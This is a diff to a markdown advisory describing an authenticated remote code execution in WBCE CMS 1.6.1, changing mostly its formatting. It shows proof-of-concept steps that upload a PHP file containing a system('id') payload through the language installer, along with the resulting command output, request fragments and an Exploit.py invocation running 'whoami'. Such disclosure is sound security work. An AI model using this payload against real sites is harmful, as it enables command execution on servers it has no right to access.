@@ -6,16 +6,14 @@
 - **Software Link:** [WBCE CMS 1.6.1](https://github.com/WBCE/WBCE_CMS/archive/refs/tags/1.6.1.zip)
 - **Version:** 1.6.1
 
-<img src="https://raw.githubusercontent.com/capture0x/WBCE_CMS/main/1.png" alt="WBCE_CMS Image" width="1000">
-
-<img src="https://raw.githubusercontent.com/capture0x/WBCE_CMS/main/2.png" alt="WBCE_CMS Image" width="1000">
-
+![WBCE_CMS Image 1](https://raw.githubusercontent.com/capture0x/WBCE_CMS/main/1.png)
+![WBCE_CMS Image 2](https://raw.githubusercontent.com/capture0x/WBCE_CMS/main/2.png)
 
 ### POC:
 
 1. Login with admin credentials and click on Add-ons.
-2. Navigate to Language > Install Language >https://demos6.demo.com/admin/languages/index.php
-3. Upload `upgrade.php` with the content `<?php echo system('id'); ?>`, then click install > https://demos6.demo.com/admin/languages/install.php
+2. Navigate to Language > Install Language > [https://demos6.demo.com/admin/languages/index.php](https://demos6.demo.com/admin/languages/index.php)
+3. Upload `upgrade.php` with the content `<?php echo system('id'); ?>`, then click install > [https://demos6.demo.com/admin/languages/install.php](https://demos6.demo.com/admin/languages/install.php)
 4. The command execution result will be displayed: 
 
 uid=1000(soft) gid=1000(soft) groups=1000(soft)
@@ -57,13 +55,12 @@ Content-Type: application/x-php
 
 -----------------------------86020911415982314764024459
 Content-Disposition: form-data; name="submit"
+```
 
+```
+-----------------------------86020911415982314764024459--
 
------------------------------86020911415982314764024459--```
-
-### Response:
-
-```<!-- ################### Up from here: Original Code from original template ########### -->
+<!-- ################### Up from here: Original Code from original template ########### -->
 
 <!-- senseless positioning-table: needed for old modules which base on class td.content -->
 <div class="row" style="overflow:visible">
@@ -76,9 +73,11 @@ uid=1000(soft) gid=1000(soft) groups=1000(soft)
     <div class="top alertbox_error fg12 error-box">
         <i class=" fa fa-2x fa-warning signal"></i>
                     <p>Invalid WBCE CMS language file. Please check the text file.</p>    
-                    <p><a href="index.php" class="button">Back</a></p>```
+                    <p><a href="index.php" class="button">Back</a></p>
+```
 
+### Exploit:
 
-### Exploit :
+To exploit this vulnerability, use the provided Python script:
 
-python3 Exploit.py https://demos6.demo.com/admin/ admin password 'whoami'
+```python3 Exploit.py https://demos6.demo.com/admin/ admin password 'whoami'```
